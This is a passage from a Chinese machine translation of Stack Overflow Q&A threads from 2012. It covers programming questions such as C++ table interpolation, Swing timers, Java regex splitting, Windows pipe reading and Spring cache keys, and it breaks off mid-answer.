*   4 GB 内存
*   SSD 垂直 3

该软件是带有官方（闭源）radeon 驱动程序的 debian 6。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-09T14:33:32.777

您可以执行无损旋转，只修改 EXIF 部分。这将更快地旋转您的图片。

并查看执行无损 jpeg 修改的 jpegtran 实用程序。 [https://linux.die.net/man/1/jpegtran](https://linux.die.net/man/1/jpegtran)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-09T14:27:10.273

[irfanview](http://www.irfanview.ca/)有一个 jpeg no-recompression 插件，IIRC 可以在不重新压缩的情况下旋转和调整图像大小（以简单的方式），它还可以运行图像目录 - 这应该快得多

GPU可能无济于事，您几乎可以肯定在opencv中受到I / O限制，它并不是真正适合高速文件访问

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-10T23:15:10.987

我不是 jpeg 和压缩主题方面的专家，但是由于您的问题几乎受到 I/O 限制（假设您可以在没有大量与解码/编码相关的计算的情况下旋转），您可能无法在你拥有的 GPU 上加速它。(Un) 幸运的是，您的参考资料是一个相当慢的 Atom CPU。

我假设 Radeon 有单独的主内存。这意味着数据需要通过 PCI-E 进行通信，与 CPU 执行相比，这是额外的延迟，并且在不隐藏的情况下，您可以确定它是瓶颈。这是您在 GPU 上使用 OpenCV 的代码很慢的最可能原因（除了您执行两个内存绑定操作，转置和翻转，而不是单个操作）。

[关键是通过使用multi-buffering](http://en.wikipedia.org/wiki/Multiple_buffering)尽可能多地隐藏计算的 PCI-E 传输时间。[仅当相关卡具有双 DMA 引擎（如高端 Radeon](http://www.bit-tech.net/hardware/graphics/2010/12/15/ati-radeon-hd-6970-review/1)或[NVIDIA Quadro/Tesla 卡](http://www.nvidia.com/docs/IO/40049/Dual_copy_engines.pdf)）时，才能通过利用 PCI-E 的全双工功能将 GPU 与 GPU 之间的传输与计算重叠——我非常怀疑。

如果您的 GPU 计算时间（GPU 进行旋转所需的时间）低于传输所需的时间，您将无法完全重叠。HD 4530 有一个相当慢的内存接口，峰值只有[12.8 Gb/s](http://en.wikipedia.org/wiki/Comparison_of_AMD_graphics_processing_units#Mobility_Radeon_HD_5xxx_Series)，旋转内核应该是相当受内存限制的。但是，我只能猜测，但我想说的是，如果您达到约 1.5 Gb/s（4x PCI-E AFAIK）的峰值 PCI-E 传输速率，计算内核将比传输快几倍，而您将能够重叠很少。您可以简单地分别对各个部分进行计时，而无需复杂的异步代码，并且您可以估计获得具有最佳重叠的事物的速度。

您可能要考虑的一件事是获得不会将 PCI-E 视为瓶颈的硬件，例如：

*   [基于AMD APU](http://www.amd.com/us/products/technologies/fusion/Pages/fusion.aspx)的系统。在这些平台上，您将能够页面锁定内存并直接从 GPU 使用它；
*   与主机共享主存的集成 GPU；
*   一个快速的低功耗 CPU，例如移动 Intel Ivy Bridge，例如[i5-3427U](http://ark.intel.com/products/64903/Intel-Core-i5-3427U-Processor-%283M-Cache-up-to-2_80-GHz%29)，它的消耗几乎与[Atom D525](http://ark.intel.com/products/49490)一样少，但支持 AVX，并且应该快几倍。

# java - swing - 组件的短时高亮

> ID：11396859
> 
> 赞同：2
> 
> 时间：2012-07-09T14:16:09.710
> 
> 标签：java, swing, swingworker

我有一个 JTable，用户可以在其中选择一行。如果发生这种情况，我想在短时间内“突出显示”页面的另一部分，以表明这是在用户交互后更改的页面部分。

所以我的问题是：实现这一目标的最佳方法是什么？目前，我通过设置该面板的背景颜色并启动一个 SwingWorker 来完成它，该 SwingWorker 在短暂延迟后将颜色设置回来。它按预期工作，但使用这样的 SwingWorker 是个好主意吗？这种方法有什么缺点吗？你会如何解决这个问题？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-10T07:49:29.720

我想 Swing Timer 会是一个更好的选择，因为它为所有计划的事件重用一个线程并在主事件循环上执行事件代码。因此，在您的`SelectionListener`代码中，您可以：

```
// import javax.swing.Timer;

final Color backup = componentX.getBackground();
componentX.setBackground(Color.YELLOW);
final Timer t = new Timer(700, new ActionListener() {
  public void actionPerformed(ActionEvent e) {
    componentX.setBackground(backup);
  }
});
t.setRepeats(false);
t.start(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T16:15:18.280

我推荐一个摇摆定时器（javax.swing.Timer）。（不要在 Java.util 中使用 Timer 类）

这是您制作计时器的地方：

```
Timer t = new Timer(loopTime,actionListener)//loopTime is unimportant for your use of this
t.setInitialDelay(pause)//put the length of time between starting the timer and the color being reverted to normal
t.setRepeats(false);//by default, timer class runs on loop.
t.start();//runs the timer 
```

保留对计时器的引用可能是有意义的，然后在需要时调用 t.start 。

您需要实现一个动作侦听器来处理计时器事件。如果您不知道该怎么做，我可以编辑它，但由于您已经在使用 Swing 做一些事情，我认为这应该不是问题。

# c++ - 比 if else if else... 更好的方法用于线性插值

> ID：11396860
> 
> 赞同：14
> 
> 时间：2012-07-09T14:16:11.573
> 
> 标签：c++, interpolation

问题很简单。假设你有功能

```
double interpolate (double x); 
```

并且您有一个具有已知 x-> y 映射的表，
例如
5 15
7 18
10 22
**注意：**真实表更大 ofc，这只是示例。

所以对于 8 你会返回 18+((8-7)/(10-7))*(22-18)=19.3333333

我发现的一种很酷的方法是 [http://www.bnikolic.co.uk/blog/cpp-map-interp.html](http://www.bnikolic.co.uk/blog/cpp-map-interp.html) （长话短说它使用 std::map, key= x, value = y for x->y数据对）。

如果有人问标题中的 if else if else 方式是什么，基本上是：

```
if ((x>=5) && (x<=7))
{
//interpolate
}
else 
     if((x>=7) && x<=10)
     {
      //interpolate
     } 
```

那么有没有更聪明的方法来做到这一点，或者地图方式是最先进的？:)

顺便说一句，我更喜欢 C++ 中的解决方案，但显然任何具有 1:1 映射到 C++ 的语言解决方案都很好。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-07-26T17:57:20.627

好吧，我能想到的最简单的方法是使用二进制搜索来找到你的观点所在的点。如果可以的话，尽量避免使用地图，因为它们在实践中非常慢。

这是一个简单的方法：

```
const double INF = 1.e100;
vector<pair<double, double> > table;
double interpolate(double x) {
    // Assumes that "table" is sorted by .first
    // Check if x is out of bound
    if (x > table.back().first) return INF;
    if (x < table[0].first) return -INF;
    vector<pair<double, double> >::iterator it, it2;
    // INFINITY is defined in math.h in the glibc implementation
    it = lower_bound(table.begin(), table.end(), make_pair(x, -INF));
    // Corner case
    if (it == table.begin()) return it->second;
    it2 = it;
    --it2;
    return it2->second + (it->second - it2->second)*(x - it2->first)/(it->first - it2->first);
}
int main() {
    table.push_back(make_pair(5., 15.));
    table.push_back(make_pair(7., 18.));
    table.push_back(make_pair(10., 22.));
    // If you are not sure if table is sorted:
    sort(table.begin(), table.end());
    printf("%f\n", interpolate(8.));
    printf("%f\n", interpolate(10.));
    printf("%f\n", interpolate(10.1));
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-10T10:36:24.977

您可以使用二叉搜索树来存储插值数据。当您有大量 N 个插值点时，这很有用，因为插值可以在 O(log N) 时间内执行。但是，在您的示例中，情况似乎并非如此，RedX 建议的线性搜索更合适。

```
#include <stdio.h>
#include <assert.h>

#include <map>

static double interpolate (double x, const std::map<double, double> &table)
{
    assert(table.size() > 0);

    std::map<double, double>::const_iterator it = table.lower_bound(x);

    if (it == table.end()) {
        return table.rbegin()->second;
    } else {
        if (it == table.begin()) {
            return it->second;
        } else {
            double x2 = it->first;
            double y2 = it->second;
            --it;
            double x1 = it->first;
            double y1 = it->second;
            double p = (x - x1) / (x2 - x1);
            return (1 - p) * y1 + p * y2;
        }
    }
}

int main ()
{
    std::map<double, double> table;
    table.insert(std::pair<double, double>(5, 6));
    table.insert(std::pair<double, double>(8, 4));
    table.insert(std::pair<double, double>(9, 5));

    double y = interpolate(5.1, table);

    printf("%f\n", y);
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-10T09:44:27.543

存储您的点排序：

```
index X    Y
1     1 -> 3
2     3 -> 7
3     10-> 8 
```

然后从最大值循环到最小值，一旦你低于一个数字，你就知道它是你想要的。

你想这么说`6`：

```
// pseudo
for i = 3 to 1
  if x[i] <= 6
    // you found your range!
    // interpolate between x[i] and x[i - 1]
    break; // Do not look any further
  end
end 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-07-09T14:25:35.500

是的，我想你应该在这些区间和自然数之间的映射中思考。我的意思是，只需标记间隔并使用开关：

```
switch(I) {

    case Int1: //whatever
        break;

      ...

    default:

} 
```

我不知道，这是我首先想到的。

**如果您的数字在相对较小的间隔内，则EDIT** Switch 比 if-else 更有效（在进行映射时要考虑这一点）

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-08-10T17:48:49.590

如果您的 x 坐标必须是不规则间隔的，则按排序顺序存储 x 坐标，并使用二进制搜索查找最近的坐标，例如使用 Daniel Fleischman 的答案。

但是，如果您的问题允许，请考虑对规则间隔的数据进行预插值。所以

```
   5 15
   7 18
   10 22

```

变成

```
   5 15
   6 16.5
   7 18
   8 19.3333333
   9 20.6666667
   10 22

```

然后在运行时，您可以使用以下内容插入 O(1)：

```
double interp1( double x0, double dx, double* y, int n, double xi )
{
   double f = ( xi - x0 ) / dx;
   if (f<0) return y[0];
   if (f>=(n-1)) return y[n-1];
   int i = (int) f;
   double w = f-(double)i;
   return dy[i]*(1.0-w) + dy[i+1]*w;
} 
```

使用

```
double y[6] = {15,16.5,18,19.3333333, 20.6666667, 22 }
double yi = interp1( 5.0 , 1.0 , y, 5, xi ); 
```

这不一定适用于所有问题——你最终可能会失去准确性（如果没有包含所有 x 样本的漂亮网格），如果它会使你的表变得更大，它可能会产生糟糕的缓存惩罚。但对于您开始对 x 坐标有一定控制权的情况，这是一个不错的选择。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-10T09:57:00.207

您如何获得它是相当可读和可以理解的，并且对于“聪明”的解决方案有很多话要说。但是，您可以取消下限检查和笨拙`&&`，因为序列是有序的：

```
if (x < 5)
  return 0;
else if (x <= 7)
  // interpolate
else if (x <= 10)
  // interpolate
... 
```

# fluent-nhibernate - Fluent nHIbernate - 将引用/嵌入类映射到与父级相同的表

> ID：11396862
> 
> 赞同：0
> 
> 时间：2012-07-09T14:16:14.033
> 
> 标签：fluent-nhibernate

我有一个平面视图，其中包含以下列：

ResultID
ResultName
ResultTime
DisciplineCode
DisciplineName
DateModified

ETC...

我有一个当前与上述模式匹配的 Result 类（平面）

```
public class Result
{
    public virtual string ResultID { get; set; }
    public virtual string ResultName { get; set; }
    public virtual decimal ResultTime { get; set; }
    public virtual string DisciplineCode { get; set; }
    public virtual string DisciplineName { get; set; }
    public virtual DateTime DateModified { get; set; }
} 
```

我想要的是将我的 Discipline 属性分离到它们自己的类中，如下所示：

```
public class Discipline
{
    public virtual string DisciplineCode { get; set; }
    public virtual string DisciplineName { get; set; }
} 
```

然后将我的`Result`课程更改为：

```
public class Result
{
    public virtual string ResultID { get; set; }
    public virtual string ResultName { get; set; }
    public virtual decimal ResultTime { get; set; }
    public virtual Discipline Discipline { get; set; }
    public virtual DateTime DateModified { get; set; }
} 
```

这样 就`Discipline`被嵌入为一个类。

详细信息来自同一张表（或者在我的情况下，标准化视图）

如何使用流利的 nHibernate 映射它

我看过参考资料，但不确定这是否正确？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T15:10:27.033

组件对此进行了排序。

没想到几天前我实际上已经问过这个问题（以不同的形式）

在这里查看我的答案 - [https://stackoverflow.com/a/11397884/131809](https://stackoverflow.com/a/11397884/131809)

# java - 匹配一个“.” 在java中

> ID：11396864
> 
> 赞同：0
> 
> 时间：2012-07-09T14:16:20.647
> 
> 标签：java, regex

我有以下字符串

```
String srcString = "String1.String2.String3"; 
```

我想在“。”上拆分“srcString”。

使用 srcString.split(".") 匹配所有字符。

匹配“。”的正则表达式是什么？?

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-09T14:17:03.903

在正则表达式中，[点](http://www.regular-expressions.info/dot.html)是表示除行分隔符之外的*任何字符的*[特殊字符](http://www.regular-expressions.info/characters.html#special)（也使其匹配行分隔符使用标志）。*`Pattern.DOTALL`*

 *无论如何，使用`split("\\.")`

解释：

*   为了逃避`.`，我们可以`\`在它之前添加，所以我们最终得到了正则表达式`\.`
*   现在由于`\`在字符串文字中也很特殊，`" "`我们还需要在那里对其进行转义，所以要表达`\.`我们需要将其写为`"\\."`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T14:18:19.443

用作`split("\\.")`. (dot) 是特殊字符，所以`\\`在 .(dot) 之前使用

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:30:25.010

您也可以调用`org.apache.commons.lang.StringUtils.split(String, char)`库的功能`commons-lang`[http://commons.apache.org/lang/][1]*

# c++ - 如何判断管道上是否有新数据？

> ID：11396870
> 
> 赞同：1
> 
> 时间：2012-07-09T14:16:40.433
> 
> 标签：c++, winapi, pipe, named-pipes

我在 Windows 上工作，我正在尝试学习管道，以及它们是如何工作的。

我还没有找到的一件事是如何判断管道上是否有新数据（来自管道的子/接收器端？

通常的方法是有一个线程读取数据，并将其发送到处理：

```
void GetDataThread()
{
    while(notDone)
    {
        BOOL result = ReadFile (pipe_handle, buffer, buffer_size, &bytes_read, NULL);
        if (result) DoSomethingWithTheData(buffer, bytes_read);
        else Fail();
    }
} 
```

问题是 ReadFile() 函数等待数据，然后读取它。有没有一种方法可以判断是否有新数据，而无需实际等待新数据，如下所示：

```
void GetDataThread()
{
    while(notDone)
    {
        BOOL result = IsThereNewData (pipe_handle);
        if (result) {
             result = ReadFile (pipe_handle, buffer, buffer_size, &bytes_read, NULL);
             if (result) DoSomethingWithTheData(buffer, bytes_read);
             else Fail();
        }

        DoSomethingInterestingInsteadOfHangingTheThreadSinceWeHaveLimitedNumberOfThreads();
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:26:45.360

使用[`PeekNamedPipe()`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365779%28v=vs.85%29.aspx)：

```
DWORD total_available_bytes;
if (FALSE == PeekNamedPipe(pipe_handle,
                           0,
                           0,
                           0,
                           &total_available_bytes,
                           0))
{
    // Handle failure.
}
else if (total_available_bytes > 0)
{
    // Read data from pipe ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T15:37:21.393

另一种方法是使用 IPC 同步原语，例如事件 ( [CreateEvent()](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682396%28v=vs.85%29.aspx) )。在具有复杂逻辑的进程间通信的情况下 - 您也应该关注它们。

# css - 我的 JS 手风琴表现得很愚蠢——它到处乱跳

> ID：11396872
> 
> 赞同：0
> 
> 时间：2012-07-09T14:16:49.947
> 
> 标签：css, accordion, jquery-ui-accordion

我正在尝试实现`js`我发现的手风琴，但我遇到了问题。标题应该干净利落地滑到页面顶部，然后将内容放在下面。这不是正在发生的事情。当你看到它时，会有一些明显的跳跃。它一点也不光滑。我不太了解，`js`所以请仔细解释您的答案。非常感谢！

[http://imip.rvadv.com/accordion.html](http://imip.rvadv.com/accordion.html)

**编辑：** 用我从中获取的站点中的默认文件替换 js 后，没有任何改变。这是一个jsfiddle

[http://jsfiddle.net/imakeitpretty/ruwjn/](http://jsfiddle.net/imakeitpretty/ruwjn/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T02:27:09.083

检查这个：http: [//jsfiddle.net/luissanchezm86/ruwjn/4/](http://jsfiddle.net/luissanchezm86/ruwjn/4/)

问题不在于.js，你不必全部写在jsfiddle上，因为它是JQuery UI，你可以简单地检查它以包含它，如果它是另一个外部.js，将它用作资源，检查[小提琴的文档](http://doc.jsfiddle.net/)。

除此之外，另一个问题是你的**CSS**标记，你在那个小提琴中有很多重复的类，有点乱。

跳跃的主要问题是：

```
.st-accordion ul li.st-open > a{
    margin-top: 70px;
} 
```

我刚刚评论了`margin-top: 70px;`，它解决了 75% 的问题，我建议你使用我在 jsfiddle 上安排的 css。

希望对你有帮助！

* * *

**更新**

现在，如果你想像[http://jsfiddle.net/luissanchezm86/ruwjn/5/](http://jsfiddle.net/luissanchezm86/ruwjn/5/)那样一直向上滚动，你需要让身体的高度更高：

```
body {
    height: 2000px; 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:23:35.080

查看您的代码后，您似乎正在使用此插件：

```
http://tympanus.net/codrops/2011/10/12/flexible-slide-to-top-accordion/ 
```

如果您转到该页面，它具有控制动画速度所需的 javascript 选项，以及一个比您的更流畅的工作示例。

# c - 使用系统函数获取另一个进程的输出而不使用文件

> ID：11396873
> 
> 赞同：1
> 
> 时间：2012-07-09T14:16:58.197
> 
> 标签：c

> **可能重复：**
> [从 system() 命令捕获标准输出的最佳方法，以便将其传递给另一个函数](https://stackoverflow.com/questions/125828/best-way-to-capture-stdout-from-a-system-command-so-it-can-be-passed-to-anothe)

我有一个 C 语言程序，我在其中调用系统函数来运行不同的可执行文件。如何在控制台而不是文件上获取其他程序的输出。可以做这样的事情吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:27:47.240

是的。你使用管道。每个进程都有两个标准流——stdout 和 stderr。这些只是 io 流。它们可以映射到文件或控制台管道。当您生成新进程时，您将新进程的输出管道设置为重定向到控制进程上的文件句柄。从那里你可以做任何你喜欢的事情。例如，您可以读取子进程管道并将其输出推送到控制进程的输出管道。

在 Windows 中，您可以这样做：

```
#define SHANDLE         HANDLE

bool CmdShell::makePipe( SHANDLE& read, SHANDLE& write )
{
   SECURITY_ATTRIBUTES sa;
   sa.nLength = sizeof( SECURITY_ATTRIBUTES );
   sa.lpSecurityDescriptor = NULL;
   sa.bInheritHandle = true;

   SHANDLE writeTmp;
   if ( !CreatePipe( &read, &writeTmp, &sa, 0 ))
   {
      assert(0);
      return false;
   }

   if ( !DuplicateHandle( GetCurrentProcess(), writeTmp, 
                          GetCurrentProcess(), &write, 0,
                          FALSE, DUPLICATE_SAME_ACCESS ))
   {
      assert(0);
      return false;
   }
   CloseHandle( writeTmp );

   return true;
} 
```

在linux上，你这样做：

```
#define SHANDLE         int

bool CmdShell::makePipe( SHANDLE& read, SHANDLE& write )
{
   s32 pipeD[2];
   if ( pipe( pipeD ))
   {
      assert(0);
      return false;
   }
   read = pipeD[0];
   write = pipeD[1];
   return true;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:36:30.783

问题很简单，“我如何在控制台上获得其他程序的输出......”

简单的答案是让其他程序写入标准输出。

需要更好的答案才能将第二个程序的输出传递回第一个程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:23:12.147

`popen`运行另一个程序并为您提供一个 FILE* 接口到它的输出，因此您可以像读取文件一样读取它，请参阅[如何使用 POSIX 在 C++ 中执行命令并获取命令的输出？](https://stackoverflow.com/questions/478898/how-to-execute-a-command-and-get-output-of-command-within-c)

# dynamics-crm - 如何使用对话框在“创建表单”中设置字段值？

> ID：11396875
> 
> 赞同：0
> 
> 时间：2012-07-09T14:17:04.383
> 
> 标签：dynamics-crm, dynamics-crm-2011

有没有办法通过使用对话框而不先保存实体来更新活动实体的创建表单字段？

让我解释。

客户给我们打电话，我们的代表打开电话活动。此时它处于“创建新”状态。

现在，由于我们在系统中有很多联系信息和其他相关信息，因此我创建了一个对话框来帮助用户找出来电者的信息。对话框首先询问来电者的姓名。然后它询问他打电话给哪栋建筑/公寓（这是我们商业模式的一部分）。然后它会继续询问一段时间。

最后，对话框收集了所有必要的信息，并将值放入表单中。

但事情就是这样。我在对话框中使用了更新过程，但我当然不能更新不存在的东西。所以目前它的工作方式就像我们总是必须先保存并为实体命名。然后运行对话框。

这是一个小故障，但如果出于某种原因，在对话中间取消了该过程，则可能会出现问题。然后我们会在那里打一个空电话，上面有一些标题。除了一次额外的点击总是一次额外的点击。

我希望你能理解我的问题。

请随时询问。

再见！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T21:30:27.557

像 Greg 一样，在我看来，您正在尝试同时捕获有关联系人和电话的信息，因此从打开新记录开始可能不是最结构化的方法。几种可能性：

*   使用对话框，但不一定要针对联系人运行它。也许对用户运行它。使用前几页来确定这是否是现有联系人，如果不是，则从捕获的数据创建一个，然后针对选定或创建的联系人创建电话记录。例如，您可以从仪表板上的链接运行这样的对话框，您不需要导航到用户屏幕来执行此操作。

*   [Gareth Tucker 在他的博客http://gtcrm.wordpress.com](http://gtcrm.wordpress.com)上写了几篇关于联络中心自动化的文章，包括一些关于在电话表单上使用 JScript 来捕获联系详细信息并创建链接的有趣想法（带有可免费下载的示例）即时联系记录

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T15:27:32.147

在我看来，业务流程可以改进。理想情况下，您的解决方案是更改您的对话流程，使其针对客户（`contact`？）实体运行，即当您的客户致电时，用户会找到该记录并运行您的对话，而不是创建电话呼叫活动然后运行对话。

也就是说，如果我正确理解了您的问题，您可能正在使用该对话框来帮助用户查找客户的详细信息。这是真的？我不明白这将如何工作，因此您可能需要在此处向我们提供一些额外信息。

如果根本问题是用户找不到客户，听起来您需要在客户视图中为用户提供更多搜索字段...

# mongodb - 找不到 groovy-starter.conf

> ID：11396878
> 
> 赞同：1
> 
> 时间：2012-07-09T14:17:10.537
> 
> 标签：mongodb, grails, groovy

我正在构建一个链接到 mongodb 数据库的 grails 应用程序，这是我第一次使用，一切都很顺利，因为我删除了数据库（我以前做过很多次并且没有问题）然后当我尝试再次运行该应用程序，但出现此错误...

配置主类加载器时出现异常：

```
java.io.FileNotFoundException: C:\Users\MyUser\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\TC5JXQ28\springsource\grails-2.0.3\conf\groovy-starter.conf (The system cannot find the path specified)
    at java.io.FileInputStream.open(Native Method)
    at java.io.FileInputStream.<init>(FileInputStream.java:120)
    at java.io.FileInputStream.<init>(FileInputStream.java:79)
    at org.codehaus.groovy.grails.cli.support.GrailsStarter.rootLoader(GrailsStarter.java:133)
    at org.codehaus.groovy.grails.cli.support.GrailsStarter.main(GrailsStarter.java:262) 
```

我沿着这条路走，它只走了一半就断了。谁能帮我理解这意味着什么以及如何将其指向正确的位置？

# ruby-on-rails - 尝试（和失败）安装机车 CMS

> ID：11396881
> 
> 赞同：1
> 
> 时间：2012-07-09T14:17:16.573
> 
> 标签：ruby-on-rails, unicorn, locomotivecms

我正在尝试使用他们的多站点选项在虚拟机架空间服务器上安装 Locomotive CMS。我可以运行安装并毫无问题地选择我的第一个子域。但是一旦我创建了这个，子域地址会给出一个 404 错误，而根域会给我一个“没有站点！” 错误！

我已经在 /etc/hosts 中设置了记录，并且正在使用 Unicorn。我错过了一些明显的东西吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-21T17:30:21.860

尝试使用[pow](http://pow.cx/)（连同 powify gem）来设置您的主机。工作轻而易举！

# orchardcms - 在 Orchard 中显示内容部分

> ID：11396884
> 
> 赞同：0
> 
> 时间：2012-07-09T14:17:23.907
> 
> 标签：orchardcms

我希望能够准确指定 ContentPart 在视图中的呈现位置。

例如，在我的 Content.Summary.cshtml 中，我想将我的标题和画廊中的第一张图片（我正在使用 ZenGallery）包装在一个锚标记中。我以为我可以这样做，但画廊模板没有呈现。

```
<a href="@Url.ItemDisplayUrl((IContent)Model)">
  <h2>@Model.ContentItem.TitlePart.Title</h2>
  @Display(Model.ContentItem.ZenGalleryPart)
</a> 
```

但是，如果我执行以下操作，则图库模板 (ZenGallery.Summary.cshtml) 将与所有其他部分一起显示。

```
@Display(Model.Content) 
```

我知道推荐的方法可能是使用 Placement.info，对吗？但是这种方式对我来说更有意义，并且可以对最终标记进行更精细的控制。我怎样才能实现我正在寻找的标记？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T13:12:39.240

这应该给你一个很好的开始，让你准确地做你想做的事：[http ://weblogs.asp.net/bleroy/archive/2011/07/31/so-you-don-t-want-to-use-placement -info.aspx](http://weblogs.asp.net/bleroy/archive/2011/07/31/so-you-don-t-want-to-use-placement-info.aspx)

# oauth - 关于在 DNN 上实现 oAuth 服务器的任何指示？

> ID：11396895
> 
> 赞同：2
> 
> 时间：2012-07-09T14:17:58.400
> 
> 标签：oauth, dotnetnuke, oauth-2.0, dotnetopenauth, oauth-provider

我需要建立一个在线工具生态系统（这些工具在各种平台上，如 Moodle、Website Baker、ASP.Net、php 等，有些已经构建，有些从其他供应商购买，有些将要构建），我想要一个最终用户应该拥有的单一登录。

这些独立的工具目前拥有自己的登录机制。

我计划在 DNN 上构建一个中央系统，用户在其中注册，并且该系统公开了一个 oAuth 服务，其他系统使用该服务对用户进行身份验证。

我正在考虑使用 DNN (DotNetNuke) 平台，原因如下： 1\. 我是一名 ASP.Net 开发人员，对 DNN 有一定程度的了解（不是很多，但足以知道它有提供者和模块的概念，我可以根据我的需要定制）。2\. 我需要一个购物车和一个注册系统，我希望能得到一些现成的第三方解决方案。

我需要输入什么：是否已经有一些 DNN 组件公开了来自 DNN 站点的 oAuth 身份验证？我正在寻求实现类似于谷歌为它的 oAuth 接口实现的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-10T11:33:09.913

如果我对您的理解正确，您正在尝试使用 oauth 构建称为 3 腿身份验证，您希望 dotnetnuke 作为提供者。为了在 dotnetnuke 中执行此操作，您需要提供一个 UI，消费者可以在其中注册并获取 AppId 和 consumerKey。完成后，消费者会将用户发送到 dotnetnuke 进行登录。Dotnetnuke 将验证用户并将适当的信息返回给消费者。

以下是一些可以帮助您的事情：

1.  [DotNetOAuth 库](http://www.dotnetopenauth.net/)
2.  OAuth 网站
3.  [http://code.google.com/p/extremeswankoauth/wiki/Server_Examples](http://code.google.com/p/extremeswankoauth/wiki/Server_Examples)
4.  [http://www.cleancode.co.nz/blog/523/oauth-dot-net](http://www.cleancode.co.nz/blog/523/oauth-dot-net)
5.  java中的示例oAuth实现

如果您需要更多帮助，请告诉我。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-29T19:29:51.673

我不知道这是否是完成解决方案的最佳方式，但这是我所做的。

[这里](https://github.com/DotNetOpenAuth/DotNetOpenAuth.Samples)有一个 DotNetOpenAuth 的代码示例，它使用 OAuth 对用户进行身份验证。可能您会看到有更多示例，甚至更新，但.. 请注意，因为如果您使用 DNN 的最新版本 (7.x)，它使用 .NET Framework 4 工作，而较新的示例使用 4.5。所以，看看第一个例子！名为 OAuth.ashx 的 ASP NET 处理程序是您的 OAuth 服务提供者。

然后，我基于示例构建了一个 DNN 模块，使 DNN 作为 OAuth 服务工作。

我按照[本指南](http://www.dnnsoftware.com/wiki/page/module-development)构建模块。有一些视频展示了模块开发的基础知识。

# cakephp - 无法使用控制台创建 ACL 表

> ID：11396896
> 
> 赞同：0
> 
> 时间：2012-07-09T14:18:01.397
> 
> 标签：cakephp

我之前成功地使用过蛋糕模式创建 DbAcl。由于某种原因，我现在得到的输出不是我需要的。shell 正在返回一些帮助选项，但不会创建 aros 和 acos 表。帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:43:38.067

我不得不将控制台文件夹的路径复制到我的环境变量中并重新启动命令行。那成功了

# algorithm - 为图构建 BFS 树的复杂性是什么？

> ID：11396898
> 
> 赞同：-1
> 
> 时间：2012-07-09T14:18:06.263
> 
> 标签：algorithm, time-complexity

我知道 BFS 需要 O(n+m) 时间，其中 n 是节点，m 是弧。

在执行 BFS 时构建树怎么样？

只要在最坏的情况下树完全不平衡，它是否会增加另一个 n？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:42:27.890

不完全确定我是否在关注，但如果是：

> 它是否增加了另一个 n

您的意思是复杂性将是`O(n+m+n)`，请注意`O(n+m+n) = O(n+m)`，所以这里没有真正的问题。

树的构建可以在 中完成`O(n+m)`，因为它可以表示为一个数组`a[1,...,n]`，其中`a[i] = j if and only if node i is connected to node j in the tree`（以及根的特殊标记）

所以，在 BFS 期间，当节点`v`“发现”节点`u`时，你只需要做`a[u]=v`，这是在恒定时间内完成的，并且是精确地完成`n`的，所以总复杂度保持不变`O(n+m)`

# c# - Silverlight 中的日文字符输入

> ID：11396900
> 
> 赞同：1
> 
> 时间：2012-07-09T14:18:10.170
> 
> 标签：c#, silverlight, internationalization

我目前正在研究一个接受 Unicode 字符并正确显示这些字符的 Silverlight 解决方案，但是文本框似乎不接受外来字符，例如日语（我目前正在尝试平假名）和中文。这些可以从剪贴板复制，但是在 Windows 中更改语言栏时无法输入这些字符。这是一个常见问题吗？应该如何处理？

非常感谢任何帮助

# spring - 使用带有 @Cacheable 注释的 Spring bean 作为键

> ID：11396911
> 
> 赞同：2
> 
> 时间：2012-07-09T14:18:31.877
> 
> 标签：spring, caching, spring-el

如何使以下工作： - 具有应使用 @Cacheable 注释缓存的方法的 spring bean - 为缓存创建键的另一个 spring bean (KeyCreatorBean)。

所以代码看起来像这样。

```
@Inject
private KeyCreatorBean keyCreatorBean;

@Cacheable(value = "cacheName", key = "{@keyCreatorBean.createKey, #p0}")
@Override
public List<Examples> getExamples(ExampleId exampleId) {
  ... 
```

但是上面的代码不起作用：它给出了以下异常：

```
Caused by: org.springframework.expression.spel.SpelEvaluationException: 
    EL1057E:(pos 2): No bean resolver registered in the context to resolve access to bean 'keyCreatorBean' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-10T11:31:02.173

我检查了底层缓存解析实现，似乎没有一种简单的方法可以注入`BeanResolver`解析 bean 和评估表达式（如`@beanname.method`.

因此，我还会推荐一种类似于@micfra 推荐的方法。

按照他所说的，按照这些思路有一个 KeyCreatorBean，但在内部将它委托给您在应用程序中注册的 keycreatorBean：

```
